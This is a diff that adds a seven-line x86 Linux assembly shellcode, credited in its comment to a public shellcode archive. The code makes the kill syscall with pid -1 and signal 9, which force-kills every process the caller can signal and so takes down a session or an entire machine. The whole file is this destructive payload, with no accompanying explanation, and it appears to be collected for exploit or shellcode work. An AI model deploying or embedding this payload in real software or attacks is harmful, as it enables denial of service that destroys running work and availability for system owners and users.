@@ -1,0 +1,7 @@
+;original code from : http://shell-storm.org/shellcode/files/shellcode-626.php
+xor    eax,eax
+mov    al,0x25
+push   0xffffffff
+pop    ebx
+mov    cl,0x09
+int    0x80
